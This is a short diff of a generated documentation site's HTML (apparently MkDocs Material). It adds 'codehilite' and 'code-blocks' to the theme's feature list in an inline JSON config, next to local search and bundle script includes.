-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
